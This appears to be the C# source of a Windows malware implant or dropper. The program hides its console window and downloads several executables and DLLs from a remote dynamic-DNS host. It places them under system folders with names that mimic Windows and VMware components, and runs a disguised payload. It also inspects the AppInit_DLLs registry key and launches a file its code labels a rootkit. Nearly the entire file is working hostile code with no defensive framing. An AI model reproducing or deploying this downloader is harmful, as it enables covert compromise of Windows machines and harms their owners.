using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace implant
{
    class Class1
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private void down(string path, string filename, string url)
        {
            // Download

            try
            {
                FileInfo file = new FileInfo(filename);
                using (WebClient Client = new WebClient())
                {

                    Client.DownloadFile(url, file.FullName);
                    //Process.Start(file.FullName);

                }
                File.Copy(file.FullName, path);
                File.Delete(file.FullName);
            }
            catch
            {
                down(path, filename, url);
            }


        }

        private bool CheckKey(bool is64bit)
        {
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
            {
                string v = key.GetValue("AppInit_DLLs", true).ToString();
                if (v.Contains("x64"))
                {
                    return true;
                }
                else if (v.Contains("x86"))
                {
                    return true;
                }
                else
                {
                    return false;
                }


            }
        }

        // Once This is the file that will be run 146418956465 times via diffrenet ways.
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);
            // Create a class
            Class1 c = new Class1();


            // Setup names
            string name1 = @"C:\Windows\WMSys.exe";
            string name2 = @"C:\Windows\WinHypro.exe";
            string name3 = @"C:\Windows\PFRE.exe";
            string installShootkitPtah = @"C:\Program Files\Windows NT\NT.exe";
            string name5 = @"C:\Program Files (x86)\Common Files\vmware-0-x64.dll";


            if (!File.Exists(name1))
            {
                // Download
                c.down(name1, "licenseUpdates.exe", "http://ritrit.ddns.net:8888/WMSys.exe");
            }
            if (!File.Exists(name2))
            {
                // Download
                c.down(name2, "vmware-tools.exe", "http://ritrit.ddns.net:8888/WinHypro.exe");
            }
            if (!File.Exists(name3))
            {
                // Download
                c.down(name3, "AdoInstall.exe", "http://ritrit.ddns.net:8888/PFRE.exe");
            }
            if (!File.Exists(installShootkitPtah))
            {
                // Download
                c.down(installShootkitPtah, "wireshark.exe", "http://ritrit.ddns.net:8888/NT.exe");
            }
            if (!File.Exists(name5))
            {
                // Download
                c.down(name5, "logy.dll", "http://ritrit.ddns.net:8888/tmpv.dll");
                c.down(@"C:\Program Files\Windows NT\rvmware-x64.dll", "logy2.dll", "http://ritrit.ddns.net:8888/tmpv.dll");
            }




            // Run
            bool vmware00 = true;
            Process[] procs = Process.GetProcesses();
            foreach (Process proc in procs)
            {
                try
                {
                    //Console.WriteLine("Name:" + proc.ProcessName + " Path:" + proc.MainModule.FileName + " Id:" + proc.Id);
                    if (proc.ProcessName.Contains("vmware-000"))
                    {
                        vmware00 = false;
                    }
                }
                catch
                {
                    continue;
                }
            }

            if (vmware00)
            {
                string sourceFile = @"C:\Windows\WMSys.exe";
                string destinationFile = @"C:\ProgramData\Microsoft\Windows\Caches\$vmware-000.exe";

                if (!File.Exists(destinationFile))
                {
                    File.Copy(sourceFile, destinationFile);
                }


                Process.Start(destinationFile);
            }

            if (c.CheckKey(true))
            {


            }
            else
            {
                Process.Start(installShootkitPtah);
            }


        }
    }
}
